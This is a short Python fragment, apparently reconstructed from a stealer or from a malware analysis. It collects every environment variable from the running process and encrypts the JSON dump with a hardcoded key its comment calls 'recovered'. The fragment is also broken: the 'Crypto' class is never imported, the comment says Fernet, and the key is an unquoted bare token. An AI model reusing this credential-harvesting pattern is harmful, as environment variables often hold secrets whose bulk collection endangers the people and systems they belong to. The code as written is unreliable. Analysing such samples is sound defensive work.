import os
import json

def collect_data():
    return {
        "environment_variables": dict(os.environ)
    }

def encrypt_data(data: dict) -> bytes:
    # Initialize Fernet with the recovered encryption key
    f = Crypto(Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ)

    # Convert the collected data into JSON and then into bytes
    plaintext = json.dumps(data).encode()

    # Encrypt the data and return the Fernet token
    return f.encrypt(plaintext)
